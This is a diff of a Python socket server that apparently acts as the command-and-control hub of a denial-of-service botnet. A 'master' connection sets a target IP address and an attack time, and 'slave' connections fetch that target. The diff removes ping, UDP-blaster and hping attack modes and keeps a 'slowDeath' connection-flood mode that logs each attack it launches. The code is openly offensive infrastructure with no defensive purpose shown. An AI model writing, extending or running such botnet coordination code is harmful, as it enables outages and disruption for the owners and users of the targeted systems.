@@ -8,72 +8,32 @@ import datetime
 
 master='master'
 slowDeath = 'slowDeath'
-ping='slaveping'
-punch= "slavepunch"
-test = "slavetest"
-hping = 'slavehping'
-slaveping='udp'
 global ipAdd
-global numPing
 global ping_time
-ipAdd ='192.168.4.161'
-numPing = 5
+#ipAdd ='192.168.4.161'
 ping_time = "2013-03-27-21-05-0"
 threads = 100
 
 def handler(clientsock,addr):
 	while 1:
 			global ipAdd
-			global numPing
 			global ping_time
 			data = clientsock.recv(BUFSIZ)
-				#		clientsock.send(msg)
 			print >>sys.stderr, '\nReceived: "%s"' % data
 			if data == master:
 				ipAdd = clientsock.recv(BUFSIZ)
 				print >>sys.stderr, 'New IP Address: "%s" ' % ipAdd
-				#time.sleep(2)
-				numPing = str(clientsock.recv(BUFSIZ))
-				print >>sys.stderr, 'Number of Pings: "%s"' % numPing
 				ping_time = clientsock.recv(BUFSIZ)
 				clientsock.send('\n\nConfirmed IP Address: "%s" ' % ipAdd)
-				clientsock.send('\nConfirmed Number of Pings: "%s" ' % numPing)
-				clientsock.send('\nConfirmed Ping Time: "%s" ' % ping_time)
-				break
-			elif data == ping:
-				clientsock.send(ipAdd)
-				time.sleep(1)
-				clientsock.send(str(numPing))
-				time.sleep(1)
-				clientsock.send(str(ping_time))
-				print >>sys.stderr, 'Attacked %s with %s Pings' % (ipAdd, numPing)
-				break
-			elif data == punch:
-				clientsock.send(ipAdd)
-				print >>sys.stderr, 'Attacked %s with UDP Packet Blaster' % ipAdd
-				break
-			elif data == test:
-				clientsock.send(ipAdd)
-				print >>sys.stderr, 'Attacked %s with Test' % ipAdd
-				break
-			elif data == hping:
-				clientsock.send(ipAdd)
-				print >>sys.stderr, 'Attacked %s with Hping' % ipAdd
-				break
-			elif data == slaveping:
-				clientsock.send(ipAdd)
-				time.sleep(1)
-				clientsock.send(str(numPing))
-				time.sleep(1)
-				clientsock.send(str(ping_time))
-				print >>sys.stderr, 'Attacked %s with %s Pings' % (ipAdd, numPing)
+				clientsock.send('\nConfirmed Attack Time: "%s" ' % ping_time)
 				break
 			elif data == slowDeath:
 				clientsock.send(ipAdd)
 				time.sleep(1)
-				#clientsock.send(threads)
+				clientsock.send(ping_time)
 				time.sleep(1)
 				print >>sys.stderr, 'Attacked %s with %s Threads of Connections' % (ipAdd, threads)
+				#break
 			else:
 				print >>sys.stderr, 'Invalid Access From: ', clientsock
 				break
